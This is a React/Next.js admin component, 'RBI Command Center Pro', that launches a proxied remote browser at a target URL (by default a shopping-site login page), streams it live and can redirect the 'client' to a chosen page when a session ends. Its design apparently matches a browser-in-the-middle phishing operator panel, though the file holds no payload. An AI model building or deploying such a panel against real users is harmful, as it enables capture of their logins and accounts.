"use client";

import { useState } from "react";
import LiveStreamViewer from "@/components/LiveStreamViewer";

export default function ProxyAndStreamManager() {
  const [proxyType, setProxyType] = useState("socks5");
  const [ip, setIp] = useState("");
  const [port, setPort] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [targetUrl, setTargetUrl] = useState("https://zentralmall.com/login");
  const [loading, setLoading] = useState(false);
  const [isSessionActive, setIsSessionActive] = useState(false);
  
  const [redirectUrl, setRedirectUrl] = useState("https://success-portal.com/complete");
  const [ending, setEnding] = useState(false);
  const [redirecting, setRedirecting] = useState(false);

  const [sessionStats, setSessionStats] = useState({
    ip: "Direct Connection",
    country: "Global",
    city: "Active",
    isp: "Open",
    status: "Standby"
  });

  const handleLaunchBrowser = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const proxyString = ip && port 
      ? `${proxyType.toLowerCase()}://${username ? `${username}:${password}@` : ""}${ip}:${port}`
      : "";

    try {
      const res = await fetch("/api/admin/proxy-launch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ proxyString, targetUrl })
      });
      const data = await res.json();
      if (data.success) {
        setIsSessionActive(true);
        setSessionStats({
          ip: ip || "Direct Connection",
          country: "Global",
          city: "Active",
          isp: "Network Open",
          status: "Live & Streaming"
        });
      } else {
        alert("Error: " + (data.error || "Failed to launch browser"));
      }
    } catch (err) {
      console.error(err);
      alert("Network request failed!");
    } finally {
      setLoading(false);
    }
  };

  const handleEndSession = async () => {
    if (!confirm("Kya aap active session terminate karna chahte hain?")) return;
    
    setEnding(true);
    try {
      const res = await fetch("/api/admin/session/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ redirectUrl }),
      });
      const data = await res.json();
      if (data.success) {
        setIsSessionActive(false);
        setSessionStats(prev => ({ ...prev, status: "Standby" }));
        alert("Session successfully terminated!");
      }
    } catch (err) {
      console.error(err);
    } finally {
      setEnding(false);
    }
  };

  const handleRedirectUser = async () => {
    setRedirecting(true);
    try {
      // Client ko specified link par redirect trigger karne ka API ya action
      const res = await fetch("/api/admin/session/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ redirectUrl }),
      });
      const data = await res.json();
      if (data.success) {
        window.open(redirectUrl, "_blank");
      }
    } catch (err) {
      console.error("Redirect failed", err);
    } finally {
      setRedirecting(false);
    }
  };

  return (
    <div className="p-6 space-y-6 text-zinc-100 bg-zinc-950 min-h-screen">
      
      {/* Top Pro Header */}
      <div className="flex items-center justify-between border-b border-zinc-800 pb-4">
        <div>
          <h1 className="text-xl font-black tracking-tight">RBI Command Center Pro</h1>
          <p className="text-xs text-zinc-400">Manage proxy nodes separately and launch isolated browser streams instantly.</p>
        </div>
        <div className="flex items-center gap-2 bg-emerald-950/50 border border-emerald-500/30 px-3 py-1.5 rounded-xl text-xs text-emerald-400 font-bold">
          <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
          System Online
        </div>
      </div>

      {/* Configuration & Stats Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Left Column: Pure Proxy Configuration */}
        <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 space-y-3 lg:col-span-1 shadow-xl text-xs">
          <h2 className="text-sm font-bold text-zinc-200 mb-2">Proxy Node Settings</h2>
          
          <div className="grid grid-cols-2 gap-2">
            <div>
              <label className="block text-zinc-400 mb-1 font-bold">Protocol:</label>
              <select 
                value={proxyType} 
                onChange={(e) => setProxyType(e.target.value)}
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none cursor-pointer"
              >
                <option value="socks5">SOCKS5</option>
                <option value="http">HTTP</option>
              </select>
            </div>
            <div>
              <label className="block text-zinc-400 mb-1 font-bold">Port:</label>
              <input 
                type="text" 
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="1081"
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
              />
            </div>
          </div>

          <div>
            <label className="block text-zinc-400 mb-1 font-bold">Proxy IP Address:</label>
            <input 
              type="text" 
              value={ip}
              onChange={(e) => setIp(e.target.value)}
              placeholder="Leave empty for direct connection"
              className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
            />
          </div>

          <div className="grid grid-cols-2 gap-2">
            <div>
              <label className="block text-zinc-400 mb-1 font-bold">Username:</label>
              <input 
                type="text" 
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="username"
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
              />
            </div>
            <div>
              <label className="block text-zinc-400 mb-1 font-bold">Password:</label>
              <input 
                type="text" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="password"
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-zinc-100 outline-none font-mono"
              />
            </div>
          </div>
          <p className="text-[10px] text-zinc-500 italic">Note: Proxy changes browser location/IP automatically when specified.</p>
        </div>

        {/* Right Column: Status + Browser Launcher + Lifecycle & Redirect Controls */}
        <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 lg:col-span-2 shadow-xl flex flex-col justify-between space-y-4">
          
          {/* Geolocation Status Bar */}
          <div>
            <h2 className="text-sm font-bold text-zinc-200 mb-3">Session & Routing Status</h2>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-xs">
              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                <span className="text-zinc-500 block mb-1">Active IP</span>
                <span className="font-mono text-emerald-400 font-bold">{sessionStats.ip}</span>
              </div>
              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                <span className="text-zinc-500 block mb-1">Region</span>
                <span className="font-bold text-zinc-200">{sessionStats.country}</span>
              </div>
              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                <span className="text-zinc-500 block mb-1">Node</span>
                <span className="font-bold text-zinc-200">{sessionStats.city}</span>
              </div>
              <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                <span className="text-zinc-500 block mb-1">Status</span>
                <span className="text-emerald-400 font-bold flex items-center gap-1.5">
                  {isSessionActive && <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>}
                  {sessionStats.status}
                </span>
              </div>
            </div>
          </div>

          {/* Quick Browser URL Launcher with Dynamic Button State */}
          <form onSubmit={handleLaunchBrowser} className="bg-zinc-950 p-4 rounded-xl border border-zinc-800 space-y-3 text-xs">
            <div>
              <p className="font-bold text-zinc-200 text-xs">Quick Browser URL Launcher</p>
              <p className="text-[10px] text-zinc-400">Enter target website URL to launch browser instantly in the live viewport.</p>
            </div>
            <div className="flex items-center gap-2">
              <input 
                type="url" 
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                required
                placeholder="https://www.google.com"
                className="bg-zinc-900 border border-zinc-800 px-3 py-2.5 rounded-xl text-xs text-zinc-200 font-mono outline-none w-full"
              />
              <button 
                type="submit"
                disabled={loading}
                className={`font-bold px-5 py-2.5 rounded-xl text-xs transition shadow-lg cursor-pointer whitespace-nowrap flex items-center gap-2 ${
                  isSessionActive 
                    ? "bg-emerald-600 hover:bg-emerald-700 text-white" 
                    : "bg-blue-600 hover:bg-blue-700 text-white"
                }`}
              >
                {isSessionActive && <span className="w-2 h-2 rounded-full bg-white animate-ping"></span>}
                {loading ? "Launching..." : isSessionActive ? "Session Active" : "Launch Browser"}
              </button>
            </div>
          </form>

          {/* End Session Control */}
          <div className="bg-zinc-950 p-4 rounded-xl border border-zinc-800 flex items-center justify-between gap-4 text-xs">
            <div>
              <p className="font-bold text-zinc-200">Session Lifecycle Control</p>
              <p className="text-[10px] text-zinc-400">Keep session active or terminate it manually.</p>
            </div>
            <button 
              onClick={handleEndSession}
              disabled={ending}
              className="bg-rose-600 hover:bg-rose-700 text-white font-bold px-5 py-2.5 rounded-xl text-xs transition shadow-lg cursor-pointer whitespace-nowrap"
            >
              {ending ? "Ending..." : "End Session"}
            </button>
          </div>

          {/* Redirect User Control */}
          <div className="bg-zinc-950 p-4 rounded-xl border border-zinc-800 flex items-center justify-between gap-4 text-xs">
            <div>
              <p className="font-bold text-zinc-200">User Redirect Control</p>
              <p className="text-[10px] text-zinc-400">Redirect client to any specified URL/page.</p>
            </div>
            <div className="flex items-center gap-2 w-full max-w-md">
              <input 
                type="text" 
                value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
                placeholder="https://success-portal.com/complete"
                className="bg-zinc-900 border border-zinc-800 px-3 py-2 rounded-xl text-xs text-zinc-200 font-mono outline-none w-full"
              />
              <button 
                onClick={handleRedirectUser}
                disabled={redirecting}
                className="bg-amber-600 hover:bg-amber-700 text-white font-bold px-4 py-2 rounded-xl text-xs transition shadow-lg cursor-pointer whitespace-nowrap"
              >
                {redirecting ? "Redirecting..." : "Redirect User"}
              </button>
            </div>
          </div>

        </div>

      </div>

      {/* Live Stream Viewport Container */}
      <div className="mt-6">
        <h2 className="text-sm font-bold text-zinc-200 mb-3">Live Remote Browser Viewport</h2>
        <LiveStreamViewer targetUrl={targetUrl} />
      </div>

    </div>
  );
}